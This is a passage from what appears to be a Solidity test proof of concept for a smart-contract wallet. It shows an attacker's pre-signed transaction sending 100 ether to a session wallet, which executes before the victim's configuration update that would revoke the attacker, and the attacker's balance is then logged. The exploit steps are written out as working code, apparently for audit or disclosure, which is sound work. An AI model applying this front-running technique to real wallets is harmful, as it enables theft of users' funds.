        payloadA.calls[0].to = sessionWallet.addr;
        payloadA.calls[0].value = 100 ether;
        payloadA.calls[0].data = "";

        bytes memory sigA = _validExplicitSignature(payloadA, sessionWallet, config, topology, new uint8[](0));

        // 3. Victim prepares Tx B (nonce 1) to update imageHash (remove attacker)
        Payload.Decoded memory payloadB = _buildPayload(1);
        payloadB.space = 0;
        payloadB.nonce = 1;
        payloadB.calls = new Payload.Call[](1);
        payloadB.calls[0].to = address(Wallet);
        // Simulate config update call (e.g., updateImageHash)
        payloadB.calls[0].data = abi.encodeWithSignature("updateImageHash(bytes32)", bytes32(uint256(1)));

        bytes memory sigB = _validExplicitSignature(payloadB, identityWallet, config, topology, new uint8[](0));

        // 4 & 5. Attacker front-runs: Tx A executes first under old config
        // Since nonce 0 < nonce 1, the protocol forces Tx A to execute before Tx B
        Wallet.execute(PrimitivesRPC.toPackedPayload(vm, payloadA), sigA);

        uint256 attackerBalAfterA = sessionWallet.addr.balance;
        console.log("Step 5: Attacker balance after Tx A =", attackerBalAfterA);

